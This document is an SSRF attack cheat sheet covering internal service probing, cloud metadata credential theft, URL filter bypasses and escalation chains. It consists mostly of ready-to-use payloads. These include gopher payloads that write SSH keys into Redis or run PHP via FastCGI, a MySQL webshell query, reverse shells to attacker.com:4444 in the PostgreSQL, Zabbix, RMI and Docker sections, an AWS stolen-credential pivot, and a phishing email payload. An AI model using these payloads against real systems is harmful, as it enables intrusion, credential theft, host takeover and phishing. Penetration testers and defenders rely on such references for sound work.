# SSRF — Server-Side Request Forgery

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to an
attacker-controlled or internal destination. It earned its own category in OWASP Top 10
2021 (A10) due to the severity of cloud-environment exploitation.

**Impact:** Internal port scanning, cloud credential theft, RCE via internal services,
lateral movement inside cloud VPCs, full compromise of metadata-exposed infrastructure.

**Sources:**
- OWASP Top 10 A10:2021 — SSRF
- PortSwigger Web Security Academy — Server-side request forgery
- HackerOne Hacktivity — Capital One breach (SSRF → IMDSv1 → S3 dump), GitLab SSRF chain

---

## Basic SSRF Techniques

### Localhost / Internal Services

```
# Direct localhost
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal RFC-1918 ranges to probe
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports to target
http://localhost:8080     # Alt HTTP / dev servers
http://localhost:8443     # Alt HTTPS
http://localhost:9200     # Elasticsearch
http://localhost:9300     # Elasticsearch cluster
http://localhost:6379     # Redis
http://localhost:5432     # PostgreSQL
http://localhost:3306     # MySQL
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker daemon (unauthenticated)
http://localhost:4444     # Various admin panels
http://localhost:8500     # Consul
http://localhost:8600     # Consul DNS
```

### Port Scanning via SSRF

```
# Probe internal ports — infer open/closed from response time/error
http://127.0.0.1:22      # SSH (connection refused vs timeout → port state)
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3000    # Node dev servers
http://127.0.0.1:5000    # Flask / Python apps
http://127.0.0.1:8080
```

---

## Cloud Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDSv1)

```
# IMDSv1 — no token required (vulnerable if not upgraded to v2)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/        # Often contains secrets/scripts
http://169.254.169.254/latest/dynamic/instance-identity/document

# Credential response contains AccessKeyId + SecretAccessKey + Token
# → exfil and use with AWS CLI
```

### AWS IMDSv2 (requires PUT token first)

```bash
# Step 1 — get token (requires PUT; SSRF via GET alone won't work)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <TOKEN>

# Note: Some SSRF vectors support custom headers (e.g., Gopher) → IMDSv2 bypass possible
```

### GCP Compute Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# IP alternative:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Instance Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean / Oracle / Alibaba Cloud

```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## Blind SSRF Detection

Blind SSRF has no visible response — detection requires out-of-band (OOB) callbacks.

### Out-of-Band via Collaborator / Interactsh

```
# Use Burp Collaborator or https://app.interactsh.com for callbacks
http://YOUR-COLLABORATOR-ID.burpcollaborator.net
http://YOUR-ID.oast.fun
http://YOUR-ID.interactsh.com

# Inject in every URL-accepting parameter:
url=http://YOUR-ID.oast.fun
imageUrl=http://YOUR-ID.oast.fun/img.png
webhook=http://YOUR-ID.oast.fun/callback
```

### DNS-Only SSRF

```
# Some filters block HTTP but allow DNS — test with a DNS-only payload
# Watch for DNS query in OOB tool with no HTTP
url=http://blind-ssrf-test.YOUR-ID.oast.fun

# Subdomain-encode info for exfil:
url=http://$(hostname).YOUR-ID.oast.fun
```

### Timing-Based Detection

```
# Internal closed port → fast TCP RST (quick error)
# Internal open port → slow/timeout or valid response
# Non-existent internal IP → timeout (longer delay)
# Compare response times to infer port/host state
```

---

## Filter Bypass Techniques

### IP Obfuscation

```
# Decimal representation of 127.0.0.1
http://2130706433/

# Octal
http://0177.0.0.1/

# Hex
http://0x7f000001/

# Mixed formats
http://127.0x0.0.1/
http://127.0.00.1/

# IPv6 localhost
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL-encoded dot
http://127%2E0%2E0%2E1/

# 169.254.169.254 decimal
http://2852039166/

# 169.254.169.254 hex
http://0xa9fea9fe/
```

### Alternative Localhost Representations

```
http://localhost/
http://LOCALHOST/
http://LocalHost/
http://[::]:80/          # IPv6 any → localhost equivalent in some stacks
http://spoofed.domain/   # DNS resolves to 127.0.0.1
http://127.1/            # Short form
http://127.0.1/
```

### DNS Rebinding

```
# Register a domain that alternately resolves to your server and 127.0.0.1
# 1. App resolves domain → your server (passes allowlist check)
# 2. App makes the actual request → DNS re-resolves to 127.0.0.1
# Tools: singularity.me, rbndr.us, whonow
http://rebind.network/  # Online rebinding service
```

### Open Redirect Chain

```
# If app follows redirects, use an open redirect on an allowlisted domain
# to redirect to internal target

# Example: target allowlists example.com
https://example.com/redirect?url=http://169.254.169.254/

# Common open redirect params: redirect, next, return, url, to, dest, go
```

### Protocol Switching

```
# file:// — read local files
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token

# dict:// — port probing, banner grabbing
dict://127.0.0.1:6379/info    # Redis INFO command

# gopher:// — arbitrary TCP data (most powerful)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# ftp:// — some parsers allow
ftp://127.0.0.1:21/

# sftp:// / tftp:// / ldap:// — varies by stack
```

### URL Parser Inconsistencies

```
# Different parsers may interpret these differently
http://attacker.com@127.0.0.1/           # username: attacker.com, host: 127.0.0.1
http://127.0.0.1#@allowlisted.com/       # fragment tricks
http://allowlisted.com:80@127.0.0.1/     # port + credential confusion
http://127.0.0.1%0d%0a/                  # CRLF injection in URL

# Scheme case variation
HTTP://127.0.0.1/
Http://127.0.0.1/
```

---

## SSRF to RCE Escalation

### Redis via Gopher (unauthenticated Redis → RCE)

```
# Write a cron job or SSH key via Redis CONFIG SET
# URL-encoded gopher payload to write authorized_keys:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A%0Assh-rsa AAAA...your-pubkey...%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Tools: Gopherus (generates gopher payloads for Redis, MySQL, FastCGI, etc.)
# https://github.com/tarunkant/Gopherus
```

### Elasticsearch Code Execution (older versions)

```
# Elasticsearch <1.6 with dynamic scripting enabled
http://localhost:9200/_search?source={"script":"java.lang.Runtime.getRuntime().exec('id')"}

# POST to run scripts
POST http://localhost:9200/_search
{"script_fields":{"test":{"script":"import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

### Jenkins Script Console

```
# Internal Jenkins at localhost:8080
http://localhost:8080/script

# If accessible, Groovy script console allows RCE:
# "println 'id'.execute().text"
```

### Spring Boot Actuator

```
# Spring Boot Actuator endpoints leak env vars, heap dumps, and allow shutdown
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/shutdown    # POST → kills the app
http://localhost:8080/actuator/restart

# /actuator/env + /actuator/refresh → inject malicious Spring config for RCE
# (Spring Cloud + POST /actuator/env with spring.cloud.bootstrap.location=attacker URL)
```

### AWS Credential Theft → Account Pivot

```bash
# 1. Steal credentials via IMDSv1 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 2. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ec2-role
aws s3 ls
aws secretsmanager list-secrets

# 4. Pivot to further services / escalate via overly-permissive role
```

---

## Common Vulnerable Parameters

```
# URL parameters frequently processed server-side
url=
imageUrl=
image_url=
avatarUrl=
avatar_url=
redirect=
next=
return=
returnUrl=
return_url=
dest=
destination=
go=
goto=
forward=
continue=
callback=
callbackUrl=
callback_url=
webhook=
webhookUrl=
webhook_url=
fetch=
endpoint=
proxy=
proxyUrl=
proxy_url=
src=
href=
link=
target=
host=
api=
feed=
data=
path=
load=
open=
download=
```

---

## Common Vulnerable Endpoints / Features

| Feature | Why Vulnerable |
|---------|---------------|
| Webhook configuration | App makes request to user-supplied URL |
| PDF generation (HTML-to-PDF) | Renders user HTML including external URLs |
| Image preview / thumbnail service | Fetches remote image via server |
| URL metadata unfurler (Slack-like) | Server fetches URL for title/OG tags |
| Import from URL | Imports CSV/JSON/XML from remote location |
| Screenshot service | Headless browser fetches URL |
| Proxy / translation service | Routes requests through server |
| OAuth / SAML metadata fetch | Fetches IdP metadata from URL |
| Dependency/package install via URL | Package manager fetches remote code |
| IP geolocation lookup | Passes host to internal geo API |

---

## Detection Notes

- Always test URL-accepting parameters with OOB payloads (Collaborator/Interactsh) first
- Check for DNS callbacks even when HTTP fails (DNS-only SSRF)
- Include SSRF probes in file upload fields (SVG with external references, XML with XXE)
- Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
- When you get any internal response (even an error page), escalate: try metadata endpoints
- Response timing differences reveal open vs closed ports even without response body

---

## Additional Bypass Vectors

### CIDR Range — Full 127.0.0.0/8 Loopback Block

```
# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
http://127.0.1.3/
http://127.100.200.50/
http://127.127.127.127/

# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
```

### Ultra-Short IP Notation

```
http://0/              # Resolves to 0.0.0.0 → loopback on Linux
http://127.1/          # Short-form for 127.0.0.1
http://0177.1/         # Octal + short form
http://0x7f.1/         # Hex + short form
```

### PHP `filter_var()` FILTER_VALIDATE_URL Bypass

```
# PHP 7.x filter_var() passes these as valid URLs despite being malicious
http://test???test.com@127.0.0.1/
0://evil.com:80;http://google.com:80/
http://127.0.0.1%00@evil.com/

# If app uses filter_var() for validation, these bypass the check
```

### Unicode / Enclosed Alphanumeric Bypass

```
# Some parsers normalize Unicode before DNS resolution
# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
# Use for allowlist bypass when filter does string comparison before normalization

http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
```

### JAR Scheme (Java Environments)

```
# Fully blind — no response body, but server makes outbound connection
jar:http://127.0.0.1!/
jar:https://attacker.com!/payload.zip!/path/to/file

# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
# Triggers HTTP request to the URL before the ! — confirm via OOB callback
```

### NETDOC Wrapper (Java)

```
# Java-specific alternative to file:// — bypasses some filters that block file://
netdoc:///etc/passwd
netdoc:///proc/self/environ

# Advantage: avoids \n and \r issues that file:// can have in certain contexts
```

### TFTP (UDP-based, Evades TCP Filters)

```
# TFTP operates over UDP — stateful TCP firewalls may not inspect it
tftp://attacker.com:69/TESTUDPPACKET

# Confirm OOB UDP callback with: nc -u -l -p 69
# Useful for environments with tight TCP egress but loose UDP
```

### Kubernetes Cluster Metadata

```
# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
http://10.96.0.1/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc.cluster.local/api/v1/pods

# EKS node metadata (EC2 + K8s = two metadata surfaces)
http://169.254.169.254/latest/meta-data/   # EC2 metadata still present

# K8s service account token (mounted in every pod by default)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token with API server:
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
```

### ECS Task Metadata (AWS Fargate)

```
# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds

# Get credential ID first:
http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
```

### Memcached via Gopher

```
# Gopherus-generated gopher payload for Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a

# Memcached SSRF can be used to:
# 1. Poison cached responses (cache poisoning)
# 2. Read cached data (session tokens, API responses)
# 3. If app uses Memcached for session storage → session injection → auth bypass

# Tool: gopherus --exploit memcache
```

---

## Wildcard DNS Services as Localhost Bypass

**Root cause:** String-based blocklists check the literal URL value. Wildcard DNS services
resolve any subdomain containing an IP to that IP — bypassing hostname-only filters without
requiring DNS rebinding.

```
# localtest.me — always resolves to 127.0.0.1
http://localtest.me/admin
http://www.localtest.me/admin

# localh.st — resolves to 127.0.0.1
http://localh.st/

# nip.io — embed any IP in subdomain → DNS resolves to that IP
http://127.0.0.1.nip.io/              # → 127.0.0.1
http://company.127.0.0.1.nip.io/     # → 127.0.0.1
http://169.254.169.254.nip.io/       # → 169.254.169.254 (IMDS)

# sslip.io — same concept, alternative service
http://127.0.0.1.sslip.io/

# 1u.ms — supports DNS rebinding, but static resolution also available
http://make-127.0.0.1-rr.1u.ms/
```

**Bypass logic:** Filter checks for "localhost" or "127.0.0.1" as strings — these hostnames
pass that check but DNS resolves them to the internal target.

**Attack chain:** SSRF → loopback / IMDS without triggering IP-based filters

**Stack:** Any language/framework that validates the URL string but not the resolved IP

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## HTTP 307/308 Redirect — Method and Body Preservation

**Root cause:** RFC-compliant HTTP clients preserve the original method AND body through
307 (Temporary Redirect) and 308 (Permanent Redirect). This is unlike 301/302 which
downgrade to GET. Filters that check the initial URL but follow redirects can be bypassed
by redirecting from an allowlisted host to an internal target — preserving POST data.

```
# 307 redirect preserves POST body and method
# Host your own 307 redirect or use r3dir.me:
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/

# If allowlist permits example.com:
http://example.com/redirect?to=http://169.254.169.254/  # if 307 response

# Key: IMDSv2 requires a PUT request with a specific header
# A 307 redirect from attacker.com → IMDS with PUT preserved → bypasses IMDSv2
POST/PUT https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# → 307 redirect → IMDSv2 token returned
```

**Bypass logic:** SSRF filter validates initial URL → redirect fires → client follows 307
→ request lands on internal target with original method and body intact.

**Attack chain:** SSRF → 307 redirect on allowlisted host → IMDSv2 PUT token bypass → full IMDS access

**Stack:** Any HTTP client that follows redirects (requests, urllib, fetch, curl defaults)

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## URL Parser Quirks — Missing Slashes and Whitespace Confusion

**Root cause:** Different URL parsing libraries accept non-standard URL formats that pass
validation but are then handled by network libraries that normalize them to valid requests.

```
# Missing double slash — some parsers accept scheme-only
http:127.0.0.1/admin        # urllib2 interprets as relative path, some libraries as host

# Whitespace and special character confusion (urllib2 vs requests vs urllib)
http://1.1.1.1 &@2.2.2.2#@3.3.3.3/
# urllib2 → 1.1.1.1, requests → 2.2.2.2, urllib → 3.3.3.3

# Backslash confusion
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/

# Multiple @-sign confusion
http://attacker.com:80;http://google.com:80/   # 0:// scheme variant
```

**Bypass logic:** Validation library parses the URL differently from the HTTP-making
library. Allowlist check passes the first parser; second parser resolves the internal target.

**Attack chain:** SSRF → parser confusion → internal host access despite allowlist

**Stack:** Python urllib2/requests/urllib discrepancies; similar issues in Node.js url module vs fetch

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## XSLT Injection → SSRF via `document()` Function

**Root cause:** XSLT stylesheets support the `document()` function which instructs the
XSLT processor to fetch an external URL or file. If an attacker controls the XSLT input
(or an element within it), they can make the server fetch arbitrary internal URLs.

```xml
<!-- Basic XSLT SSRF via document() function -->
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- Fetch internal URL -->
    <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- Local file read via document() -->
<xsl:value-of select="document('/etc/passwd')"/>
<xsl:value-of select="document('file:///etc/passwd')"/>
<xsl:value-of select="document('file:///proc/self/environ')"/>

<!-- Internal network probe via document() -->
<xsl:value-of select="document('http://10.0.0.1:8080/admin')"/>
<xsl:value-of select="document('http://172.16.132.1:25')"/>

<!-- XXE in XSLT for blind SSRF -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "http://SSRF_CANARY.oast.fun/">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="&ext_file;"/>
  </xsl:template>
</xsl:stylesheet>
```

**Bypass logic:** Apps that accept user-uploaded or user-crafted XSLT files process them
server-side with a full XSLT engine (Saxon, Xalan, libxslt). These engines execute
`document()` without SSRF controls applied.

**Attack chain:** SSRF via XSLT → internal service enumeration → IMDS credential theft or file read

**Stack:** Java (Saxon, Xalan), Python (lxml), PHP (XSLTProcessor), Ruby (Nokogiri XSLT)

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSLT%20Injection/README.md

---

## FastCGI Exploitation via Gopher → PHP RCE

**Root cause:** FastCGI listens on port 9000 without authentication by default. The
protocol allows setting PHP INI values per-request via `PHP_VALUE` parameters. An attacker
can set `auto_prepend_file = php://input` and inject PHP code in the request body.

```
# Gopherus-generated FastCGI gopher payload (port 9000)
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----END-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00

# Generate custom payload:
python3 gopherus.py --exploit fastcgi
# → enter SCRIPT_FILENAME path → enter command → copy gopher URL
```

**Bypass logic:** FastCGI port is often reachable internally but not externally. No
authentication required. `PHP_VALUE` injection overrides server config per-request.

**Attack chain:** SSRF → gopher://127.0.0.1:9000 → FastCGI → PHP RCE → shell

**Stack:** PHP-FPM with FastCGI listening on TCP (not just Unix socket)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## MySQL via Gopher → Database Dump / File Write

**Root cause:** MySQL without authentication (or with weak credentials) accepts the binary
MySQL protocol. Gopherus can generate a pre-authenticated gopher payload to run arbitrary
queries — including reading files and writing webshells.

```
# Generate MySQL gopher payload
python3 gopherus.py --exploit mysql
# → enter MySQL username (e.g., root) → enter query → copy gopher URL

# Example: read /etc/passwd via LOAD_FILE
# Query: select load_file('/etc/passwd')

# Example: write webshell
# Query: select "<?php system($_GET['cmd']);?>" into outfile '/var/www/html/shell.php'

# Example gopher URL structure:
gopher://127.0.0.1:3306/_[binary MySQL auth + query payload]
```

**Bypass logic:** MySQL often binds to 127.0.0.1 internally (not firewalled from
same-host apps). Unauthenticated or root-with-no-password MySQL is common in
self-hosted deployments.

**Attack chain:** SSRF → gopher://127.0.0.1:3306 → MySQL query → file write → RCE or data exfil

**Stack:** MySQL/MariaDB without password on root, or known credentials

**Source:** https://github.com/tarunkant/Gopherus

---

## PostgreSQL via Gopher → Database Dump / RCE

**Root cause:** Gopherus supports pre-built PostgreSQL authentication + query payloads.
PostgreSQL's `COPY TO/FROM` and `COPY ... TO PROGRAM` (PostgreSQL ≥9.3) enable OS command execution.

```
# Generate PostgreSQL gopher payload
python3 gopherus.py --exploit postgresql
# → enter username → enter database → enter query

# OS command via COPY TO PROGRAM (requires superuser)
# Query: COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Read server files
# Query: COPY table FROM '/etc/passwd'

# Example URL structure:
gopher://127.0.0.1:5432/_[binary PostgreSQL startup + query payload]
```

**Bypass logic:** PostgreSQL `pg_hba.conf` may allow `trust` auth for local connections.
COPY TO PROGRAM is a built-in RCE vector for superuser roles.

**Attack chain:** SSRF → gopher://127.0.0.1:5432 → PostgreSQL COPY TO PROGRAM → OS RCE

**Stack:** PostgreSQL with trust auth or known credentials; superuser role required for COPY TO PROGRAM

**Source:** https://github.com/tarunkant/Gopherus

---

## SMTP via Gopher → Email Spoofing / Phishing

**Root cause:** Internal SMTP relays often accept unauthenticated mail from localhost.
Gopher can craft raw SMTP protocol messages to send email as any internal user.

```
# Gopher payload for SMTP (port 25) — send email as victim@company.com
gopher://127.0.0.1:25/_MAIL%20FROM%3A%3Cattacker%40attacker.com%3E%0D%0ARCPT%20TO%3A%3Ctarget%40victim.com%3E%0D%0ADATA%0D%0AFrom%3A%20CEO%20%3Cceo%40company.com%3E%0D%0ATo%3A%20target%40victim.com%0D%0ASubject%3A%20Urgent%3A%20Password%20Reset%0D%0A%0D%0AClick%20here%3A%20http%3A%2F%2Fattacker.com%2Fsteal%0D%0A.%0D%0A

# Generate via Gopherus:
python3 gopherus.py --exploit smtp
# → enter target email → enter from → enter subject/body → copy gopher URL

# Ports to check: 25, 587, 465, 2525
```

**Bypass logic:** Internal SMTP servers assume local connections are trusted. The From
header can be set to any internal domain address, bypassing SPF checks for internal mail.

**Attack chain:** SSRF → gopher://127.0.0.1:25 → SMTP relay → phishing email from legit domain

**Stack:** Postfix, Sendmail, Exim without `smtpd_recipient_restrictions` on loopback

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Zabbix Agent via Gopher → RCE

**Root cause:** Zabbix agents listen on port 10050 and can execute system commands if
`EnableRemoteCommands=1` is set in the agent config (not default but common in production).

```
# Zabbix agent gopher payload for command execution
python3 gopherus.py --exploit zabbix
# → enter command (e.g., bash -i >& /dev/tcp/attacker.com/4444 0>&1)
# → copy gopher:// URL targeting port 10050

# Manual gopher payload structure:
gopher://127.0.0.1:10050/_[Zabbix agent protocol + system.run command]

# Check if Zabbix is running:
http://127.0.0.1:10050/  # Timeout or connection refused → agent status
```

**Bypass logic:** EnableRemoteCommands=1 is needed. This is set by Zabbix admins who need
to run scripts for monitoring. Agent has no authentication — any client can send commands.

**Attack chain:** SSRF → gopher://127.0.0.1:10050 → Zabbix agent → OS command → RCE

**Stack:** Zabbix agent with EnableRemoteCommands=1 on Linux servers

**Source:** https://github.com/tarunkant/Gopherus

---

## Java RMI via Gopher → Deserialization RCE

**Root cause:** Java RMI services (ports 1099, 1090) accept serialized Java objects. A
malicious serialized payload (ysoserial gadget chain) sent via gopher triggers deserialization
RCE if the target classpath contains a vulnerable library (Commons Collections, Spring, etc.).

```
# Tool: remote-method-guesser (rmg)
# Scan for RMI services:
rmg scan 127.0.0.1 --scan-action list

# Generate SSRF gopher payload for RMI deserialization:
rmg exploit 127.0.0.1 1099 CommonsCollections6 "bash -c {bash,-i,>&,/dev/tcp/attacker.com/4444,0>&1}" \
  --ssrf --gopher

# Output: gopher://127.0.0.1:1099/_[serialized ysoserial payload URL-encoded]

# Ports: 1099 (default registry), 1090 (activator), random high ports (bound objects)
```

**Bypass logic:** RMI has no auth by default. If the JVM classpath includes ysoserial-compatible
gadget chains, the deserialization is automatic and triggers OS execution.

**Attack chain:** SSRF → gopher://127.0.0.1:1099 → Java RMI deserialization → RCE

**Stack:** Java applications exposing RMI (legacy EE apps, Gradle daemon, Weblogic, JBoss)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Docker API via SSRF → Privileged Container → Host Takeover

**Root cause:** Docker daemon listens on TCP port 2375 (unauthenticated) when configured
with `-H tcp://0.0.0.0:2375`. The REST API allows creating containers with privileged mode
and host filesystem mounts — giving full root access to the host.

```
# Step 1: Confirm Docker API via SSRF
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json

# Step 2: Create privileged container with host mount
POST http://127.0.0.1:2375/containers/create?name=pwned HTTP/1.1
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "chroot /mnt sh -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"],
  "Binds": ["/:/mnt"],
  "Privileged": true
}

# Step 3: Start the container
POST http://127.0.0.1:2375/containers/pwned/start

# Alternative: write SSH key to host
# Cmd: ["sh", "-c", "mkdir -p /mnt/root/.ssh && echo 'ssh-rsa AAAA...' >> /mnt/root/.ssh/authorized_keys"]
```

**Bypass logic:** Docker API is an internal-only service. SSRF bypasses the network
boundary. Privileged + bind mount = full host compromise from inside container.

**Attack chain:** SSRF → Docker API → create privileged container → host filesystem → root shell

**Stack:** Any host running Docker with daemon on TCP 2375 (common in CI/CD, dev servers)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## WebLogic UDDI Explorer SSRF (CVE-2014-4210)

**Root cause:** Oracle WebLogic's UDDI Explorer servlet at
`/uddiexplorer/SearchPublicRegistries.jsp` makes a server-side HTTP request to a
user-supplied `operator` parameter without sanitization. This was disclosed in 2014 and
remains unpatched in legacy enterprise deployments.

```
# Probe internal services via WebLogic UDDI Explorer
http://weblogic-host:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:9200&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search

# Vary the target port/host to port scan:
http://weblogic-host:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://INTERNAL_HOST:PORT

# Error message leaks open/closed state:
# "No route to host" → closed
# "did not have a valid SOAP" → open
# Valid response body → open + content visible
```

**Bypass logic:** Legitimate enterprise feature (UDDI = Universal Description, Discovery
and Integration). No auth required to access the servlet in default configs.

**Attack chain:** SSRF → WebLogic UDDI → internal network scan + service access → credential theft

**Stack:** Oracle WebLogic 10.x, 12.x (ports 7001, 8888, 80, 443)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## WebLogic XML Deserialization via SSRF (CVE-2020-14883)

**Root cause:** WebLogic console `/console/css/` endpoint processes XML that can reference
a remote Spring context file. The Spring context is fetched and parsed, executing
arbitrary beans on load — enabling unauthenticated RCE via SSRF.

```
# Step 1: Access WebLogic console endpoint via SSRF
POST http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_nfpb=true&_pageLabel=&handle=com.bea.faces.framework.model.BackingBeanHandle%3BreleaseReferencesOnlyCom&releaseReferencesOnlyCom.loadClass=java.lang.ProcessBuilder

# Step 2: Or trigger remote Spring context fetch:
# Reference attacker-controlled Spring XML bean definition
# → server fetches and instantiates the bean → RCE
```

**Bypass logic:** WebLogic admin console at 7001 is often internal-only. SSRF bypasses
network controls to reach an unauthenticated admin endpoint with deserialization.

**Attack chain:** SSRF → WebLogic 7001/console → XML deserialization → Spring context RCE

**Stack:** Oracle WebLogic 10.3.x–12.x with admin console exposed internally

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Confluence / Jira OAuth Icon-URI SSRF (CVE-2017-9506)

**Root cause:** Atlassian Confluence and Jira's OAuth plugin fetches the icon URL of an
OAuth consumer when validating the consumer entry. The `consumerUri` parameter is passed
directly to an internal HTTP client without SSRF controls.

```
# Confluence SSRF — internal network scanning
http://confluence:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/

# Jira SSRF — same endpoint pattern
http://jira:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:6379/

# Jira gadgets makeRequest SSRF
http://jira:8080/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/

# Also works against internal Confluence/Jira instances via SSRF pivot
```

